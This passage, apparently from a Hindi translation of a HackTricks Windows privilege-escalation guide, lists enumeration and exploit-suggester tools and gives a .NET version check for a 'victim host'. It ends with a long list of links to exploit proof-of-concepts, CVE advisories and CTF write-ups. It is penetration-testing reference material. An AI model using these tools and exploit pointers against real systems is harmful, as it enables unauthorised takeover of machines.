[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच करें (github पर executable precompiled उपलब्ध है)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच करें (python से बना exe)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post के आधार पर बनाया गया tool (इसे ठीक से काम करने के लिए accesschk की आवश्यकता नहीं है, लेकिन यह उसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़ता है और काम करने वाले exploits सुझाता है (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको .NET के सही version का उपयोग करके project compile करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। victim host पर .NET का installed version देखने के लिए आप यह कर सकते हैं:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Windows Privilege Escalation की बुनियादी बातें](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [कमज़ोर फ़ोल्डर अनुमतियों का फायदा उठाकर privileges बढ़ाना](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - एक cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller और Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - संपूर्ण OSCP मार्गदर्शिका](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation मार्गदर्शिका](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation चेकलिस्ट](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters के लिए Windows Privilege Escalation के तरीके](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक पहुँचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token की चोरी](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox का पीछा: Kernel Shadows में बिल्ली-चूहे का खेल](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA सिस्टम में मौजूद privileged file system vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink का उपयोग](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [अतीत की ओर एक कड़ी: Windows पर Symbolic Links का दुरुपयोग](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF पोर्ट)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows पर खतरनाक Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` folders से लोड करना](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist की चुनौतियाँ, हल सहित](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop के साथ Pwn2Own: Windows LPE के लिए CLDFLT और DirectX Kernel Race Conditions को जोड़ना](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [सभी पर राज करने वाली एक I/O Ring: Windows 11 पर पूर्ण Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [मनमाने ढंग से फ़ाइलें मिटाने का दुरुपयोग करके Privilege बढ़ाना और अन्य बेहतरीन तरकीबें](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs का exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks भाग 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager और Windows Vault की पड़ताल](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: जब image बदलने से Privilege Escalation होता है](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent से Ssh Private Keys निकालना](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – भाग 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – भाग 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM तक अपने कदमों को फिर से खोजना](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services shared-memory offsets privilege escalation advisory](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
